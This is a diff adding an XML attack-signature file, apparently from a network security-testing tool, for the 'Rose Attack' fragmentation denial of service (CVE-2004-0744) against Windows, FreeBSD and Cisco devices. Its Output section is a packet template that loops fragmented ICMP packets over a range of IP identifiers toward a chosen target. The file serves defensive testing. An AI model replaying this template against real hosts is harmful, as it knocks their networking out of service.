@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Rose Attack"/>
+    <EngDesc display="true" value="This threat is a denial of service against the fragmentation reassembly code in Windows. It causes the target to computer to reject further fragments from other sources for a window time of approximately 2 minutes."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Resource_Exhaustion"/>
+      <item value="Implementation_Exploitation"/>
+    </Intent>
+    <Protocol display="true" value="IP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Cisco"/>
+      <item value="Microsoft"/>
+      <item value="FreeBSD"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Cisco_2600_Series_Router"/>
+      <item value="Cisco_PIX"/>
+      <item value="FreeBSD"/>
+      <item value="Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_2000_Advanced_Server"/>
+      <item value="FreeBSD_4.3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/archive/1/359144/2004-03-29/2004-04-04/0"/>
+    <CVEID display="true" value="CVE-2004-0744"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="8431"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff46504f1700a900fe009b00c9008e8cd9"/>
+    <Revision display="true" value="10"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200961562500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="ICMP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X41\X41\X41\X41"/>
+    <Created value="1139461831" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="numPackets" type="ImperfectControls.HexField16Bit" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B" range="Identification"/>
+    </for>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+    <for index="F"/>
+    <for index="G"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@range(0,256)" FragmentOffset="0" TTL="20" Protocol="1" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="false" MF="true">
+        <ICMP Type="8" Code="0" Checksum="" Identifier="@random(0,FFFF)" SequenceNumber="@random(0,FFFF)" Pointer="" unused3Byte="" Unused4Byte="" GatewayInternetAddress="" Payload="41414141"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
